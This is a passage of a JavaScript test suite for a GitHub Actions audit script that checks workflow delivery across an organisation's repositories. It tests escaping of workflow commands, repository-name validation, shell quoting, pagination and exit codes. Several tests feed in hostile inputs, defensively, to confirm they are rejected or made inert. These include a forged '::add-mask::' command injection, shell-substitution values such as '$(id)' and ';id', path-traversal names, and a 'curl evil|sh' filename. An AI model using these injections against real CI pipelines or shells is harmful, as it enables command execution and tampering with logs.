  // own sanitiser.
  assert.equal(wfEscape('a\nb'), 'a%0Ab');
  assert.equal(wfEscape('a\rb'), 'a%0Db');
  assert.equal(wfEscape('100%'), '100%25');
  assert.equal(wfEscape('%0A'), '%250A', 'a literal %0A must stay literal');
  assert.equal(wfEscape('%\n'), '%25%0A', 'the inserted escape must not be re-escaped');
});

test('an injected newline in an input cannot emit a second workflow command', async () => {
  // End-to-end through the real process, because the defect lives in what reaches
  // the RUNNER's stdout, not in what a function returns. `::error::` is
  // line-oriented, so a newline in a message does not wrap it — it starts a new
  // command the runner obeys. Pre-fix this exact invocation emitted THREE
  // directives from one thrown error, including an ::add-mask:: the caller never
  // wrote. ::stop-commands:: is the direction that matters for a detector: it
  // would switch off command processing for everything after it, silencing the
  // very error being raised.
  const r = spawnSync(
    process.execPath,
    [join(HERE, 'audit-delivery.mjs'), '--repo', 'a/b\n::add-mask::SECRET\n::error::forged'],
    { encoding: 'utf8', env: { ...process.env, GITHUB_TOKEN: 'x' } },
  );
  const commands = (r.stderr + r.stdout).split('\n').filter((l) => l.startsWith('::'));
  assert.equal(commands.length, 1, `exactly one directive, got:\n${commands.join('\n')}`);
  assert.match(commands[0], /^::error::--repo must be owner\/name/);
  assert.match(commands[0], /%0A::add-mask::SECRET/, 'the injected payload must be INERT, not absent');
});

test('auditRepo: the closed-PR walk has NO early stop — the whole history is read', async () => {
  // A near-miss from this round, recorded as a test because it is the trap the
  // NEXT person optimising this walk will step into. `created asc` costs 65 pages
  // on guard, and the obvious saving is to stop once created_at passes --until.
  // That would be wrong, and silently: the upper boundary is complete only
  // because pagination reads the ENTIRE list. A PR created after --until can
  // share a head SHA with an in-window PR, and dedupeByHead needs both members to
  // resolve the collision — dropping the out-of-window one turns a resolved
  // collision into a phantom gap. Under `asc` the window sits at the END of the
  // list, so there is no sound early stop at all: the lower edge cannot terminate
  // (everything interesting is still ahead) and the upper edge must not.
  //
  // Asserted on the CALL SHAPE because that is where a stop condition would be
  // introduced: ghPaged takes it as an options argument, so its absence is the
  // property. A response-based test cannot see the difference — a stub that
  // returns one page looks identical either way.
  const calls = [];
  await auditRepo(
    {
      ghPaged: async (...a) => {
        calls.push(a);
        return [];
      },
      gh: async () => ({ total_count: 0 }),
      ghCount: async () => 0,
    },
    { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: '2026-06-01' },
    'guard',
  );
  const pulls = calls.find((a) => String(a[0]).includes('/pulls?'));
  assert.ok(pulls, 'auditRepo must fetch closed PRs');
  // Pinned on `stopWhen` SPECIFICALLY, not on the argument count. Round 14 gave
  // this call site a required `identity`, so "passes no options at all" stopped
  // being the property and would now fail for a reason that has nothing to do with
  // early stopping — an assertion that reds on an unrelated change stops being
  // read. The hazard was never "an option is present", it is "a stop condition is
  // present", which is what this now says.
  //
  // Round 15 removed ghPaged's early-stop parameter entirely, so this assertion no
  // longer has behavior underneath it at THIS call site — a declared `stopWhen` is
  // now simply ignored. It is kept as a cheap statement of intent about the
  // closed-PR walk; the load-bearing guarantee moved to "a caller-supplied stop
  // condition is IGNORED", which drives the real paginator across two pages. Read
  // this one as documentation and that one as the check.
  assert.equal(
    pulls[2]?.stopWhen,
    undefined,
    `the closed-PR walk must pass NO stopWhen — an early stop truncates the ` +
      `head-SHA collision guard. Got: ${JSON.stringify(pulls.slice(1))}`,
  );
});

// ── Round 13: a repo identifier is a URL path segment, not a string ───────────
//
// The class: every value this process interpolates into an authenticated API
// path, plus the one value it interpolates into a command it tells an operator to
// paste. A metacharacter in a path segment does not fail — the WHATWG parser
// TRUNCATES at it and the request goes somewhere else, so two different probes
// collapse onto one benign endpoint and a guard built to prevent a silent drop
// passes while the drop happens. Measured with the parser itself:
//
//   /repos/o/guard#old/contents/.github/workflows/x.yml  ->  /repos/o/guard
//   /repos/o/n?x/pulls                                   ->  /repos/o/n
//   /repos/../x/pulls                                    ->  /x/pulls
//
// Both directions are covered below, because over-rejection fails as silently as
// under-rejection here: a legitimate name refused is a repo dropped from the
// fleet, which is the same false clean.

const REJECTED_REPO_ARGS = [
  // Every one of these was ACCEPTED before this round. Whitespace was the only
  // thing the owner/name shape check rejected.
  ['o/n;id', 'command separator'],
  ['o/n$(id)', 'command substitution'],
  ['o/n`id`', 'backtick substitution'],
  ['o/n&&id', 'shell conjunction'],
  ['o/guard#old', 'fragment — truncates the path at the repo, probes metadata'],
  ['o/n?x', 'query — same truncation'],
  ['../x', 'traversal in the owner position'],
  ['o/..', 'traversal in the name position'],
  ['o/.', 'single-dot path segment'],
  // Round 20, from Gemini's review. Neither is a traversal risk — a hyphen is not
  // path-active and GitHub would answer 404 — so these are here because the guard's
  // own error message promises "must be a GitHub login" and these are not logins.
  // Noted because the review's proposed pattern
  // (`/^[A-Za-z0-9](?:[A-Za-z0-9-]{0,37}[A-Za-z0-9])?$/`) closes the first of these
  // and NOT the second, though it named both: measured, it still accepts `a--b`.
  ['foo-/n', 'trailing hyphen in the owner — not a GitHub login'],
  ['a--b/n', 'consecutive hyphens in the owner — not a GitHub login'],
];

// The over-rejection direction for the same tightening, kept adjacent because a
// charset guard that refuses a legitimate owner drops the whole fleet and reports
// the same false clean the round-13 comment above describes. `praetorian-inc` is
// the live value this action runs under; the rest bracket the rule's edges.
for (const owner of ['praetorian-inc', 'a', 'ab', 'a-b-c', 'x'.repeat(39)]) {
  test(`parseArgs: --repo ${owner}/n is ACCEPTED (a legitimate GitHub login)`, () => {
    assert.equal(parseArgs(['--repo', `${owner}/n`], NOW).owner, owner);
  });
}

test('parseArgs: an owner ONE character over the GitHub limit is rejected', () => {
  // The bound itself, from the side that proves it is a bound and not a typo. The
  // 39-character case above is accepted, so this pair pins the exact edge.
  assert.throws(() => parseArgs(['--repo', `${'x'.repeat(40)}/n`], NOW), /must be a GitHub login/);
});

test('parseArgs: the length bound holds for HYPHENATED logins, not just solid ones', () => {
  // Round 22 (gemini): the round-20 pattern bounded ITERATIONS of a group that
  // matches one OR TWO characters, so the solid 40-x rejection above passed while
  // hyphenated shapes sailed to 77 characters. The minimal counterexample is 41
  // characters of perfectly legal single-hyphen shape; its 39-character sibling
  // proves the fix rejects it for LENGTH, not for hyphens.
  const over = `a${'-b'.repeat(20)}`;
  assert.equal(over.length, 41, 'counterexample must be over the limit by construction');
  assert.throws(() => parseArgs(['--repo', `${over}/n`], NOW), /must be a GitHub login/);
  const atLimit = `a${'-b'.repeat(19)}`;
  assert.equal(atLimit.length, 39);
  assert.equal(parseArgs(['--repo', `${atLimit}/n`], NOW).owner, atLimit);
});

for (const [arg, why] of REJECTED_REPO_ARGS) {
  test(`parseArgs: --repo ${arg} is rejected (${why})`, () => {
    assert.throws(
      () => parseArgs(['--repo', arg], NOW),
      /must be a GitHub login|repository name must be|repository name may not be|must be owner\/name/,
      `${arg} must not reach an API path`,
    );
  });
}

test('parseArgs: a metacharacter in ANY --repos entry is rejected, not just the first', () => {
  // The reproduction, at the layer that now stops it. Before this round
  // `--repos guard#old,caeruleus` produced fleet ["caeruleus"] and a clean
  // report: assertReadable got a 200 from the TRUNCATED metadata endpoint and
  // passed, then hasCaller got the same 200, found no `.content`, and answered
  // false. The explicitly named subject was removed by the very guard that
  // exists to make removing a named subject impossible.
  assert.throws(() => parseArgs(['--repos', 'guard#old,caeruleus'], NOW), /repository name must be/);
  assert.throws(() => parseArgs(['--repos', 'caeruleus,guard#old'], NOW), /repository name must be/);
  assert.throws(() => parseArgs(['--repos', 'guard?x'], NOW), /repository name must be/);
  assert.throws(() => parseArgs(['--repos', 'guard,..'], NOW), /repository name may not be/);
  assert.throws(() => parseArgs(['--repos', '.'], NOW), /repository name may not be/);
});

test('parseArgs: CONTROL — every real identifier this fleet uses still parses', () => {
  // The half of the guard that fails silently. A validator that rejects a
  // legitimate name drops that repo from the audit, and a repo absent from the
  // fleet reports nothing at all — the same false clean the charset check exists
  // to prevent. These are the actual names in use plus the full legal charset.
  const cases = [
    ['praetorian-inc/guard', 'praetorian-inc', ['guard']],
    ['praetorian-inc/guard-core', 'praetorian-inc', ['guard-core']],
    ['praetorian-inc/public-workflows', 'praetorian-inc', ['public-workflows']],
    // `.` and `_` are legal in a repo name and MUST survive: `.github` is a real
    // repository in this org, and a name-charset check that rejected a dot would
    // silently exclude it.
    ['praetorian-inc/a.b_c-1', 'praetorian-inc', ['a.b_c-1']],
    ['praetorian-inc/.github', 'praetorian-inc', ['.github']],
  ];
  for (const [arg, owner, repos] of cases) {
    const out = parseArgs(['--repo', arg], NOW);
    assert.equal(out.owner, owner, arg);
    assert.deepEqual(out.repos, repos, arg);
  }
  assert.deepEqual(parseArgs(['--repos', 'guard,caeruleus,nerva'], NOW).repos, [
    'guard',
    'caeruleus',
    'nerva',
  ]);
  // The default owner must satisfy its own validator — a guard that rejects the
  // shipped default breaks every invocation that passes no --repo at all.
  assert.equal(parseArgs([], NOW).owner, 'praetorian-inc');
});

test('assertRepoName: the charset boundary in both directions', () => {
  for (const ok of ['a', 'A9', 'guard-core', 'a.b_c-1', '.github', 'x'.repeat(100)]) {
    assert.doesNotThrow(() => assertRepoName(ok), ok);
  }
  for (const bad of ['', 'a b', 'a/b', 'a#b', 'a?b', 'a%2fb', 'a:b', '..', '.', 'x'.repeat(101)]) {
    assert.throws(() => assertRepoName(bad), /repository name/, JSON.stringify(bad));
  }
});

test('resolveFleet: an out-of-charset name THROWS instead of dropping the repo', async () => {
  // Both provenances, because the guard has to sit where the value meets the URL
  // rather than at whichever entrance happened to be audited. The explicit branch
  // would otherwise trust `parseArgs` to have run — true of the CLI and of no
  // other caller of this exported function.
  const client = {
    gh: async () => ({ name: 'x' }),
    ghPaged: async () => [{ name: 'guard#old' }, { name: 'caeruleus' }],
  };
  // Discovered fleet: a re-targeted probe here reads as "not onboarded".
  await assert.rejects(
    () => resolveFleet(client, { ...FLEET_CFG, repos: null }),
    /repository name must be/,
  );
  // Explicitly named fleet: the drop this whole guard exists to prevent.
  await assert.rejects(
    () => resolveFleet(client, { ...FLEET_CFG, repos: ['guard#old', 'caeruleus'] }),
    /repository name must be/,
  );
});

test('resolveFleet: a hostile name never reaches the API at all', async () => {
  // Ordering, not just presence. Validating AFTER the readable/caller probes
  // would still throw — and would still have sent the re-targeted request first,
  // which is what makes the 200 look like a pass. Mutant-visible: move the
  // validation below the assertReadable loop and this reds while the test above
  // stays green.
  const urls = [];
  const client = {
    gh: async (u) => {
      urls.push(u);
      return { name: 'x' };
    },
    ghPaged: async (u) => {
      urls.push(u);
      return [];
    },
  };
  await assert.rejects(
    () => resolveFleet(client, { ...FLEET_CFG, repos: ['guard#old'] }),
    /repository name must be/,
  );
  assert.deepEqual(urls, [], `no request may carry an unvalidated name. Sent: ${JSON.stringify(urls)}`);
});

test('resolveFleet: CONTROL — a legal fleet still resolves through the same path', async () => {
  // Gives the four tests above their meaning: the rejections are caused by the
  // names, not by the validation loop refusing everything.
  const client = fleetClient({
    guard: { readable: true, caller: true },
    '.github': { readable: true, caller: true },
    'a.b_c-1': { readable: true, caller: false },
  });
  assert.deepEqual(await resolveFleet(client, { ...FLEET_CFG, repos: ['guard', '.github', 'a.b_c-1'] }), [
    'guard',
    '.github',
  ]);
});

test('shq: single-quote wrapping survives a quote in the value', () => {
  // The rename remediation's filename comes from the AUDITED REPO, and the
  // sentence it lands in is a command the report tells an operator to paste while
  // responding to a false-clean alert. Quoted rather than validated on purpose: a
  // filename is DATA, and refusing a weird-but-legal one would refuse to report
  // the rename — the exact false clean that message exists to prevent.
  assert.equal(shq('.github/workflows/a.yml'), `'.github/workflows/a.yml'`);
  assert.equal(shq('a.yml; curl evil|sh'), `'a.yml; curl evil|sh'`);
  assert.equal(shq('$(id)'), `'$(id)'`);
  // The only character that can end the quoting, and the one an escape written
  // from memory gets wrong: close, escape, reopen.
  assert.equal(shq(`it's.yml`), `'it'\\''s.yml'`);
  // Verified against the real interpreter rather than asserted from the shape:
  // the payload must arrive as one inert argument.
  for (const raw of [`it's.yml`, 'a.yml; id', '$(id)', '`id`', 'a b&&id']) {
    const out = execFileSync('/bin/sh', ['-c', `printf '%s' ${shq(raw)}`], { encoding: 'utf8' });
    assert.equal(out, raw, `shq must round-trip ${JSON.stringify(raw)} through sh`);
  }
});

// ── Round 14: the row-identity contract, and "not a gap" vs "clean" ──────────
//
// Three defects with one shape between them: each was a place where the script
// answered a question it had not actually decided. ghPaged GUESSED the row key
// (`it?.id ?? it?.number ?? it?.sha`), which is right at four call sites and
// silently wrong at the fifth, where `sha` is a BLOB hash; the exit code
// collapsed "undecided" into `status=clean`; and the collision refusal promised
// a remediation that provably cannot clear the repo.
//
// Every test below is written so the PRE-FIX code fails it. That is the point:
// the earlier `commitsClient` stub supplies its own `ghPaged`, so no existing
// test could see a dedupe defect inside the real one. These use the REAL
// ghPaged through a stubbed `fetch`.

const paged = (rows, { link = '' } = {}) => ({
  status: 200,
  ok: true,
  headers: new Headers(link ? { link } : {}),
  json: async () => rows,
});

test('ghPaged: an undeclared identity FAILS CLOSED, before any request is made', async () => {
  // Fail closed rather than fall back to a guess. An undeclared key throws, which
  // surfaces as exit 2 / status=unknown — loud. The alternative that shipped was
  // a fallback chain, whose failure mode is a quietly SHORTER list, i.e. a false
  // clean. `calls` is asserted because the throw must precede the network: a
  // guard that fires after the first page has already been fetched and deduped
  // has not prevented anything.
  let calls = 0;
  const client = makeClient('t');
  await withFetch(
    async () => {
      calls++;
      return paged([{ id: 1 }]);
    },
    async () => {
      await assert.rejects(
        () => client.ghPaged('/repos/o/r/x'),
        /an explicit `identity` function is required/,
      );
      // Also rejected: a truthy non-function, which a caller reaching for the old
      // positional third argument would supply by accident.
      await assert.rejects(() => client.ghPaged('/repos/o/r/x', undefined, { identity: 'id' }), {
        message: /identity` function is required/,
      });
    },
  );
  assert.equal(calls, 0, 'the identity guard must refuse before the first fetch');
  assert.equal(client.state.calls, 0);
});

test('ghPaged: the DECLARED key dedupes — a colliding `id` does not', async () => {
  // The discriminating fixture: `id` is identical across both rows while the
  // declared key differs. Pre-fix, `it?.id` won the fallback chain and the second
  // row was dropped as a dupe; post-fix the declaration governs and both survive.
  const client = makeClient('t');
  const rows = [
    { id: 7, filename: 'a.yml' },
    { id: 7, filename: 'b.yml' },
  ];
  const got = await withFetch(
    async () => paged(rows),
    () => client.ghPaged('/repos/o/r/commits/abc', undefined, { identity: (f) => f.filename }),
  );
  assert.deepEqual(
    got.map((r) => r.filename),
    ['a.yml', 'b.yml'],
  );
  assert.equal(client.state.dupes, 0);

  // And the converse, so this cannot pass by the dedupe having been deleted
  // outright: with `id` DECLARED, the same two rows collapse to one.
  const c2 = makeClient('t');
  const collapsed = await withFetch(
    async () => paged(rows),
    () => c2.ghPaged('/repos/o/r/commits/abc', undefined, { identity: (r) => r.id }),
  );
  assert.equal(collapsed.length, 1);
  assert.equal(c2.state.dupes, 1);
});

test('ghPaged: a row whose declared key is ABSENT is kept, not dropped', async () => {
  // Direction matters. Every current call site's key is mandatory in the API's own
  // schema, so a nullish key means the response is not the shape we think it is —
  // and the safe answer there is to keep the row, because dropping it shortens the
  // list, and a shorter list is the false-clean direction the shortfall assertions
  // downstream exist to catch. Two keyless rows are kept as two.
  const client = makeClient('t');
  const got = await withFetch(
    async () => paged([{ filename: 'a.yml' }, {}, {}]),
    () => client.ghPaged('/repos/o/r/commits/abc', undefined, { identity: (f) => f.filename }),
  );
  assert.equal(got.length, 3);
  assert.equal(client.state.dupes, 0);
});

// The C3 matrix. onboardedAt's rename probe reads the single-commit file page,
// where `sha` is the BLOB hash — so pre-fix, a caller workflow whose bytes matched
// another file in the same commit collided with it and the loser was dropped and
// counted as a benign `dupes++`. With the caller as the loser, the probe cannot
// find its own row, reads "not a rename", dates onboarding to the rename commit
// and excuses every earlier PR as pre_onboarding: a false clean that depends on
// nothing but the order two files happen to appear in.
//
// All four cells are asserted rather than just the failing one. The two
// distinct-blob cells are the CONTROL that proves the fixture reaches the guard at
// all, and the same-blob/caller-first cell is why this was never caught: it threw
// correctly, so the defect was invisible to any fixture that did not also order
// the rows the other way.
const RENAME_CFG = {
  owner: 'praetorian-inc',
  callerPath: '.github/workflows/leaderboard-metrics.yml',
  since: '2026-01-01',
};

const renameProbe = async ({ sameBlob, callerSecond }) => {
  const BLOB = 'b'.repeat(40);
  const decoy = { filename: 'docs/decoy.md', sha: BLOB, status: 'added' };
  const caller = {
    filename: RENAME_CFG.callerPath,
    sha: sameBlob ? BLOB : 'c'.repeat(40),
    status: 'renamed',
    previous_filename: '.github/workflows/old-metrics.yml',
  };
  const client = makeClient('t');
  const files = callerSecond ? [decoy, caller] : [caller, decoy];
  return withFetch(
    async (url) => {
      const u = String(url);
      if (u.includes('/commits?path=')) {
        return paged([{ sha: 'a'.repeat(40), commit: { committer: { date: '2026-03-01T00:00:00Z' } } }]);
      }
      if (/\/commits\/a{40}$/.test(u)) return paged({ files });
      throw new Error(`unexpected url ${u}`);
    },
    async () => {
      try {
        return { threw: false, value: await onboardedAt(client, RENAME_CFG, 'guard'), client };
      } catch (e) {
        return { threw: true, message: e.message, client };
      }
    },
  );
};

test('onboardedAt: a rename is caught even when the caller shares a BLOB with another file', async () => {
  const r = await renameProbe({ sameBlob: true, callerSecond: true });
  assert.equal(
    r.threw,
    true,
    `identical bytes must not hide the rename. Got onboarded=${r.value} — the pre-fix ` +
      'blob-SHA dedupe dropped the caller row and dated onboarding to the rename commit.',
  );
  assert.match(r.message, /arrived by RENAME/);
  assert.match(r.message, /old-metrics\.yml/);
  // The caller row was never treated as a duplicate of the decoy.
  assert.equal(r.client.state.dupes, 0);
});

test('onboardedAt: the rename verdict does not depend on FILE ORDER', async () => {
  // The pre-fix defect was order-dependent, so order is what this pins: all four
  // cells must reach the same verdict.
  for (const sameBlob of [true, false]) {
    for (const callerSecond of [true, false]) {
      const r = await renameProbe({ sameBlob, callerSecond });
      assert.equal(
        r.threw,
        true,
        `sameBlob=${sameBlob} callerSecond=${callerSecond} must throw; got onboarded=${r.value}`,
      );
      assert.equal(r.client.state.dupes, 0, `sameBlob=${sameBlob} callerSecond=${callerSecond}`);
    }
  }
});

// ── The exit-code contract: 3 = ran, no gaps, records UNDECIDED ──────────────
//
// The expression lives in main(), which is not exported and cannot run without a
// network, so it is EXTRACTED from the shipped source and evaluated. That is
// stronger than the source-text pin in the "never calls process.exit" test above:
// that one proves the line reads a certain way, this one proves the line computes
// the right number, against reports built by the real buildReport.
// The extraction is deliberately loose about EVERYTHING except which statement it
// found, and that is the hard-won part. A first cut anchored the expression as
// `process\.exitCode = (report\.repos_with_gaps[^;]+);$` and sentinelled that the
// `undecided` expression mentioned both class names. Every mutant aimed at these
// two lines then failed to MATCH — a trailing `// MUTANT` comment defeats the `$`,
// and reordering the ternary defeats the leading anchor — so the extractor threw at
// module load, the tests below never registered, and three real defects looked like
// "invalid mutant" instead of like the kills they are. An extractor that only works
// on the correct source cannot testify about the incorrect source, which is the
// only thing it is for. So: match the ASSIGNMENT (excluding the two literal
// `process.exitCode = 2` sites by requiring the expression to mention this
// contract's own inputs), tolerate anything after the `;`, and assert only that a
// region was found — never what it contains. What it must contain is the tests'
// job, the same lesson the run-body extractor above records.
//
// Round 19 addendum, because this extractor found its own next failure mode the
// hard way. `^ *const undecided = ([^;]+);` took the FIRST such declaration in the
// file, and an unrelated function grew a local helper by that name higher up. The
// match then ran to the first `;` INSIDE that helper's body, `new Function` was
// handed a fragment, and the SyntaxError surfaced asynchronously as "a resource
// generated asynchronous activity after the test ended" — attached to whichever
// test happened to be running, naming neither this extractor nor the real cause.
// Two repairs, since either alone leaves a hole:
//   - the pattern requires the expression to mention `in_flight`, so it can only
//     match the exit-code contract's own definition and not a same-named local;
//   - the constructed function is COMPILED here. A fragment throws at module load,
//     loudly and at the right place, instead of one page later as async noise.
const EXIT_CODE_OF = (() => {
  const src = readFileSync(join(HERE, 'audit-delivery.mjs'), 'utf8');
  const und = /^ *const undecided = ((?=[^;]*in_flight)[^;]+);/m.exec(src);
  const rc = /^ *process\.exitCode = ((?=[^;]*(?:repos_with_gaps|undecided))[^;]+);/m.exec(src);
  if (!und || !rc) {
    throw new Error(
      'could not extract the exit-code expression from audit-delivery.mjs — if it was ' +
        'refactored, update this extractor; do NOT delete these tests, or the ' +
        'undecided-vs-clean distinction goes unexercised',
    );
  }
  try {
    return new Function('report', 't', `const undecided = ${und[1]}; return (${rc[1]});`);
  } catch (e) {
    throw new Error(
      `the extracted exit-code expression does not compile (${e.message}) — the regex ` +
        `matched the wrong region. undecided=<${und[1]}> exitCode=<${rc[1]}>`,
    );
  }
})();

const EMPTY_CLASSES = {
  delivered: [],
  failed: [],
  never_fired: [],
  skipped_anomaly: [],
  payload_missing: [],
  pre_onboarding: [],
  in_flight: [],
  unverifiable: [],
};
const REC = { pr: 42, number: 42, head_sha: 'd'.repeat(40), merged_at: '2026-03-02T00:00:00Z' };
const rcFor = (over) => {
  const report = buildReport(
    [{ repo: 'guard', merged_prs: 1, classes: { ...EMPTY_CLASSES, ...over } }],
    { since: '2026-01-01', until: null },
    8,
  );
  return { rc: EXIT_CODE_OF(report, report.totals), report };
};

test('exit code: an audit whose only records are UNDECIDED exits 3, not 0', () => {
  // Measured pre-fix: each of these three exited 0 and the action published
  // `status=clean has_gaps=false gap_count=0`, while the markdown report said
  // "not yet decided either way". A detector may answer yes, no, or not-yet; it
  // may not answer "no" when it means the third.
  for (const [label, over] of [
    ['in_flight only', { in_flight: [REC] }],
    ['unverifiable only', { unverifiable: [{ ...REC, unverifiable_reason: UNVERIFIABLE_REAPED }] }],
    ['both', { in_flight: [REC], unverifiable: [{ ...REC }] }],
  ]) {
    const { rc, report } = rcFor(over);
    // The precondition, asserted so a green cannot come from the report having
    // silently become a gap report: these classes are NOT gap conditions.
    assert.equal(report.repos_with_gaps.length, 0, `${label}: must not be a gap`);
    assert.equal(rc, 3, `${label}: undecided must exit 3`);
  }
});

test('exit code: a real gap still DOMINATES an undecided record', () => {
  // Demoting a confirmed gap to "undecided" would lose the actionable finding, so
  // the gap arm wins. Asserted with BOTH present, which is the only fixture where
  // the two arms disagree.
  const { rc, report } = rcFor({ never_fired: [REC], in_flight: [REC] });
  assert.equal(report.repos_with_gaps.length, 1);
  assert.equal(rc, 1);
});

test('exit code: a genuinely decided, gapless audit still exits 0', () => {
  // The control. Without it, "always return 3" passes every cell above.
  const { rc, report } = rcFor({ delivered: [REC] });
  assert.equal(report.repos_with_gaps.length, 0);
  assert.equal(report.totals.in_flight + report.totals.unverifiable, 0);
  assert.equal(rc, 0);
});

test('action contract: rc=3 publishes status=undecided, and has_gaps IS written', () => {
  const r = runAction({ exitCode: 3 });
  assert.equal(r.code, 0, `an undecided audit ran fine and must not fail the step: ${r.stderr}`);
  assert.equal(r.outputs.status, 'undecided');
  // Literally true — no gap was found — and written, which is what keeps the
  // "unwritten iff unknown" invariant the has-gaps output documents intact.
  assert.equal(r.outputs.has_gaps, 'false');
  assert.equal(r.outputs.gap_count, '0');
});

test('action contract: has_gaps CANNOT distinguish undecided from clean — status can', () => {
  // Demonstrated rather than asserted in prose, because this is exactly how an
  // undecided audit passes for a clean one: the two runs are indistinguishable on
  // `has_gaps`, and differ only on `status`. This is the test that would red if a
  // future arm "simplified" `undecided` back into `clean`.
  const clean = runAction({ exitCode: 0 });
  const undecided = runAction({ exitCode: 3 });
  assert.equal(clean.outputs.has_gaps, undecided.outputs.has_gaps);
  assert.equal(clean.outputs.gap_count, undecided.outputs.gap_count);
  assert.notEqual(clean.outputs.status, undecided.outputs.status);
});

test('classify: the collision refusal does not promise that narrowing --since settles it', () => {
  // C2. The message used to tell the operator to narrow the window. Following that
  // advice does not clear the repo: narrowing moves the collider OUTSIDE the
  // window, where the out-of-window arm refuses for the same reason — the run on
  // the shared SHA is still credited to whichever PR remains. So the refusal
  // relocates and never lifts, and "guidance that is wrong in the writing
  // direction is followed exactly once".
  const SHA = 'e'.repeat(40);
  const inWindow = pr(100, '2026-03-10T00:00:00Z', SHA);
  const collider = pr(101, '2026-02-01T00:00:00Z', SHA);
  const byHead = dedupeByHead([run(1, SHA, 'success', '2026-03-10T00:00:10Z')]);
  const onboarded = Date.parse('2026-01-01T00:00:00Z');
  const now = Date.parse('2026-04-01T00:00:00Z');

  // Step 1: both in window. The message must say narrowing does NOT settle it...
  assert.throws(() => classify([inWindow, collider], byHead, onboarded, now), /share head_sha/);
  assert.throws(
    () => classify([inWindow, collider], byHead, onboarded, now),
    /Narrowing --since to isolate one of them does NOT settle it/,
  );
  // ...and must not still be advising it. Pinned as an absence, since the defect
  // was the advice being PRESENT.
  assert.throws(
    () => classify([inWindow, collider], byHead, onboarded, now),
    (e) => {
      assert.doesNotMatch(
        e.message,
        /narrow --since to a range containing only one/,
        'the message must not advise a remediation that cannot clear the repo',
      );
      return true;
    },
  );

  // Step 2: take the old advice — narrow so only #100 is in window. Still refuses.
  // This is what makes step 1's wording load-bearing rather than cosmetic.
  assert.throws(
    () => classify([inWindow], byHead, onboarded, now, [collider]),
    /Narrowing the window cannot fix this/,
  );
});

// ── Round 15: one name, several jobs — and a paginator with no stop lever ─────
//
// Both came from Gemini on `a27c368d`, and both are the same shape as the rest of
// this file: a mechanism that RESOLVES AN AMBIGUITY BY ARRAY ORDER, and a lever
// that only ever truncates. Neither reviewer called them critical; the first is
// nonetheless a false-clean path, so it is measured here rather than argued about.

test('probeSqsStep: two jobs carrying the SAME step name and DISAGREEING is refused, not resolved by order', async () => {
  // The pre-fix code did `steps.find(...)`, so the verdict was whichever job the
  // API listed first. This drives both orders through the real function: if order
  // decided, exactly one of the two would come back 'sent'.
  const mk = (conclusion) => ({ name: SQS_STEP, conclusion });
  const jobsFor = (order) => ({
    total_count: 2,
    jobs: [{ steps: [mk(order[0])] }, { steps: [mk(order[1])] }],
  });

  for (const order of [
    ['success', 'failure'],
    ['failure', 'success'],
  ]) {
    await assert.rejects(
      () =>
        probeSqsStep(
          { gh: async () => jobsFor(order) },
          { owner: 'o' },
          'guard',
          '/repos/o/guard/actions/runs/1/jobs',
          'run 1',
        ),
      /DISAGREE \(1 succeeded, 1 did not\)/,
      `order ${order.join(',')} must refuse — not let the first job decide`,
    );
  }

  // The refusal is specific to DISAGREEMENT. A matrix whose shards agree carries
  // no ambiguity, and turning that into an audit-stopping error would be a
  // phantom failure — the other direction this script has to avoid.
  assert.equal(
    await probeSqsStep(
      { gh: async () => jobsFor(['success', 'success']) },
      { owner: 'o' },
      'guard',
      '/repos/o/guard/actions/runs/1/jobs',
      'run 1',
    ),
    'sent',
    'unanimous success must still decide',
  );
  assert.equal(
    await probeSqsStep(
      { gh: async () => jobsFor(['failure', 'failure']) },
      { owner: 'o' },
      'guard',
      '/repos/o/guard/actions/runs/1/jobs',
      'run 1',
    ),
    'not_sent',
    'unanimous non-success must still decide',
  );
});

test('ghPaged: a caller-supplied stop condition is IGNORED — the walk always completes', async () => {
  // The old assertion for this pinned `pulls[2]?.stopWhen === undefined` at one
  // CALL SITE. Once the parameter was removed that assertion pins a key nothing
  // reads — it would pass against a paginator that honored a stop, so long as
  // auditRepo did not ask for one. This tests the property that actually keeps
  // every walk complete: even handed a stop condition that is true immediately,
  // ghPaged follows the Link header to the end.
  const p1 = 'https://api.github.com/x?page=1';
  const p2 = 'https://api.github.com/x?page=2';
  const rows = await withFetch(
    async (url) =>
      String(url) === p1
        ? paged([{ id: 1 }], { link: `<${p2}>; rel="next"` })
        : paged([{ id: 2 }]),
    () =>
      makeClient('t').ghPaged(p1, undefined, {
        identity: (r) => r.id,
        stopWhen: () => true,
      }),
  );
  assert.deepEqual(
    rows.map((r) => r.id),
    [1, 2],
    'a stop condition must not truncate the walk — page 2 has to be fetched',
  );
});

// ── Round 16: a 404 is not an empty list ─────────────────────────────────────

const notFound = () => ({
  status: 404,
  ok: false,
  statusText: 'Not Found',
  headers: new Headers(),
  json: async () => ({ message: 'Not Found' }),
});

test('ghPaged: a 404 on page ONE throws instead of returning an empty list', async () => {
  // The false clean this closes, measured on the real closed-PR walk before the
  // fix: /pulls answered 404, ghPaged returned [], and the repo reported
  // `merged_prs=0 gaps=0` at exit 0 — byte-identical to a repo with nothing
  // merged in the window. An absent collection answers 200 with []; a 404 is a
  // statement about the SUBJECT, not a fact about the collection.
  let calls = 0;
  await withFetch(
    async () => {
      calls++;
      return notFound();
    },
    () =>
      assert.rejects(
        () =>
          makeClient('t').ghPaged('https://api.github.com/x?page=1', undefined, {
            identity: (r) => r.id,
          }),
        /404 on page 1 of [\s\S]*refusing to treat it as an empty list/,
      ),
  );
  // Exactly one attempt: 404 is deterministic and deliberately not in
  // RETRY_STATUS, so four tries would only make the refusal slower to surface.
  assert.equal(calls, 1, 'a 404 must not be retried');
});

test('ghPaged: a 404 MID-WALK throws and calls the walk truncated, not absent', async () => {
  // The instance the page-1 framing misses, and the worse of the two, because no
  // reading of 404 excuses it: page 1 returned rows and a `rel="next"`, so the
  // collection provably exists. `break` returned that first page as though the
  // walk had run to completion — a partial list read as a complete one, the same
  // mechanism as the 1000-cap clamp that shipped 420 phantom gaps.
  const p1 = 'https://api.github.com/x?page=1';
  const p2 = 'https://api.github.com/x?page=2';
  await withFetch(
    async (url) =>
      String(url) === p1 ? paged([{ id: 1 }], { link: `<${p2}>; rel="next"` }) : notFound(),
    () =>
      assert.rejects(
        () => makeClient('t').ghPaged(p1, undefined, { identity: (r) => r.id }),
        (e) => {
          assert.match(e.message, /404 on page 2/, 'the message must name WHICH page');
          assert.match(e.message, /TRUNCATED list, not an absent one/);
          // And it must NOT offer the page-1 reading, which is false here: an
          // operator told "the subject could not be read" would go looking for a
          // permissions problem instead of a lost page.
          assert.doesNotMatch(e.message, /An absent collection answers 200/);
